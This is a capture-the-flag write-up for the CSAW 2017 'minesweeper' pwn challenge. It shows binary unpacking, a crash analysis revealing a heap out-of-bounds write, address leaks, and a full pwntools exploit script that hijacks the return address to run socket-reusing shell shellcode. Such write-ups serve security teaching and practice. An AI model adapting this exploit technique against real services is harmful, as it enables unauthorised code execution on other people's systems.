[](ctf=csaw-quals-2017)
[](type=exploit)
[](tags=arbitrary-size)
[](techniques=shellcode)

# minesweeper (pwn-500)

[Binary](../minesweeper)

```bash
$ file minesweeper
minesweeper: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped
```

This solution would make you think that this challenge was not worth 500. Lets solve it without reversing the binary at all. The binary is UPX packed, so we first unpack it.

```bash
$ cp minesweeper upx
$ upx -d upx        
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2013
UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     13132 <-      7936   60.43%  netbsd/elf386  upx

Unpacked 1 file.
$ file upx
upx: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=90ec16e6be18b19942bf2952db17a7c1ed3ca482, stripped
$ checksec upx
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

This makes more sense. A pwn worth 500 with no protections??? seriously??
When we run it it says server started. `netstat` tells the port to be 31337. The process wais for a connection and then forks.
I connect to the port and attach gdb to the child.

```bash
nc 127.0.0.1 31337

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)
I
Please enter in the dimensions of the board you would like to set in this format: B X Y
B 10 10
```
On the binary's STDOUT it said `Allocated buffer of size: 81`.
The problem is obvious now, it should have allocated 100 bytes instead.
We can send in our input which will be copied to the buffer, so its probably an out of bounds write. Using `cyclic` from the awesome pwntools I send a payload `'XXXX'+cyclic(96)`. It crashed!
```bash
Program received signal SIGSEGV, Segmentation fault.
0x08049855 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[────────────────────────────────────REGISTERS─────────────────────────────────────]
*EAX  0x61616176 ('vaaa')
*EBX  0x0
*ECX  0x4
*EDX  0x61616177 ('waaa')
 EDI  0xf76f8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
*ESI  0xf76f8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
*EBP  0xffcc5908 —▸ 0xffcc5948 —▸ 0xffcc5998 —▸ 0xffcc59e8 ◂— ...
*ESP  0xffcc58f0 ◂— 0x0
*EIP  0x8049855 ◂— mov    dword ptr [eax + 8], edx
[──────────────────────────────────────DISASM──────────────────────────────────────]
 ► 0x8049855    mov    dword ptr [eax + 8], edx
   0x8049858    mov    eax, dword ptr [ebp + 8]
   0x804985b    mov    eax, dword ptr [eax + 8]
   0x804985e    mov    edx, dword ptr [ebp - 0x10]
   0x8049861    mov    dword ptr [eax + 4], edx
   0x8049864    mov    eax, dword ptr [stderr]       <0x804bdbc>
   0x8049869    push   eax
   0x804986a    push   9
   0x804986c    push   1
   0x804986e    push   0x804a87c
   0x8049873    call   fwrite@plt                    <0x80486a0>
[──────────────────────────────────────STACK───────────────────────────────────────]
00:0000│ esp  0xffcc58f0 ◂— 0x0
01:0004│      0xffcc58f4 —▸ 0xf76f8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
02:0008│      0xffcc58f8 ◂— 0x61616176 ('vaaa')
03:000c│      0xffcc58fc ◂— 0x61616177 ('waaa')
04:0010│      0xffcc5900 ◂— 0x4
05:0014│      0xffcc5904 —▸ 0x8f90024 ◂— 0x58585858 ('XXXX')
06:0018│ ebp  0xffcc5908 —▸ 0xffcc5948 —▸ 0xffcc5998 —▸ 0xffcc59e8 ◂— ...
07:001c│      0xffcc590c —▸ 0x80499ea ◂— add    esp, 0x10
[────────────────────────────────────BACKTRACE─────────────────────────────────────]
 ► f 0  8049855
   f 1  80499ea
   f 2  8049526
   f 3  80496b0
   f 4  8049b75
   f 5  8049d96
   f 6 f755e637 __libc_start_main+247
Program received signal SIGSEGV (fault address 0x6161617e)
pwndbg>
```

`eax` holds data at offset 88 and `edx` at 92. This would give us a very clean write-what-where. However there's a catch, contnuing execution to `0x8049861` shows that another write primitive with `eax`=`edx`. This could fuck up the clean primitive we had to write as now we need the `what` and `where` regions to be writable.

The input is saved on a custom heap with rwxp. Come on! Its 2017!
```
0x8f90000  0x8f91000 rwxp     1000 0      [heap]
```
A straight leak is also available when you view the board in the game. I foud out that if you view the board without initializing the board, you leak stack and libc. When you view it with a small initialized board you can leak the heap. Now its easy!

+ Leak the stack and heap.
+ Initialize a board large enough to contain our shellcode and calculate save eip on the stack for the function which gives us the write primitive.
+ Calculate shellcode's location on heap and replace eip with it.

For shellcode I used awesome `pwntools` - `pwnlib.shellcraft.i386.linux.dupsh()`. It'll take the fd of your socket and dup() it with stdin and stdout and then give you a shell.

```python
from pwn import *

context(arch='i386', os='linux', log_level='info')

s = remote('pwn.chal.csaw.io',7478)

for _ in xrange(5):
    s.recvline()
s.sendline("N")
for _ in xrange(4):
    s.recvline()
s.sendline("V")
s.recvline()
r = s.recv(144)
print len(r)
stack = u32(r[91:95])
success(hex(stack))
s.sendline("Q")
for _ in xrange(5):
    s.recvline()
s.sendline('I')
s.recvline()
s.sendline("B 4 4")
for _ in xrange(20):
    s.recvline()
s.sendline('X'*16)
for _ in xrange(12):
    s.recvline()
s.sendline('N')
for _ in xrange(4):
    s.recvline()
s.sendline('V')
s.recvline()
r = s.recv(0x20)
heap = u32(r[15:19])
success(hex(heap))
sleep(5)
for _ in xrange(5):
    s.recvline()
for _ in xrange(5):
    s.recvline()
s.sendline("Q")
for _ in xrange(5):
    s.recvline()
s.sendline('I')
s.recvline()
s.sendline("B 20 20")
for _ in xrange(20):
    s.recvline()

payload = '\xeb\x06'+'X'*4+'\x90'*2+asm('mov ebp,0x4')+asm(pwnlib.shellcraft.i386.linux.dupsh())
payload += 'X'*(400-len(payload)-24)
payload += p32(stack-47-8)+p32(heap+12)+'X'*16

s.sendline(payload)
s.interactive()
```

Easiest 500 points I ever scored!
